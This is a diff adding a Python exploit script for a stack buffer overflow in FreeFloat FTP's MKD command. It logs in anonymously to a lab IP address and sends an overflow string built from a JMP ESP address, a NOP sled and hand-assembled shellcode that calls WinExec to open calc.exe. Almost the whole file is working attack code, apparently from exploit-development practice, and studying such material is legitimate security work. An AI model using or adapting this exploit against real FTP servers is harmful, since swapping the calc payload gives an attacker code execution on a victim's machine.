@@ -1,0 +1,51 @@
+#!/usr/bin/python
+
+# FreeFloat FTP (MKD BOF)
+
+import socket
+import struct
+
+HOST = "192.168.88.131"
+PORT = 21
+
+#-----------------------------------------
+# (*) WinExec
+# (*) arwin.exe => Kernel32.dll - WinExec 0x7C862B5D
+# (*) MSDN Structure:
+#
+# UINT WinExec(         => PTR to WinExec
+#   LPCSTR lpCmdLine,   => calc.exe
+#   UINT   uCmdShow     => 0x01
+# );
+
+WinExec = (
+"\x33\xC0"                  # XOR, EAX,EAX
+"\x50"                      # PUSH EAX
+"\x68\x2E\x65\x78\x65"      # PUSH 2E657865 -> ".exe"
+"\x68\x63\x61\x6C\x63"      # PUSH 63616C63 -> "calc"
+"\x8B\xC4"                  # MOV EAX,ESP
+"\x6A\x01"                  # PUSH 0x01
+"\x50"                      # PUSH EAX
+"\xBB\x5D\x2B\x86\x7C"      # MOV EBX,Kernel32.WinExec
+"\xFF\xD3")                 # CALL EBX
+
+# ------------------------------------
+# Badchars: \x00\x0A\x0D 
+# 0x71a91c8b : jmp esp | wshtcpip.dll
+# ------------------------------------
+
+jmp_esp = struct.pack("<I", 0x71a91c8b)
+nops = "\x90"*20
+evil = "A"*247 + jmp_esp + nops + WinExec + "C"*(749-len(nops)-len(WinExec))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.recv(1024)
+s.close()
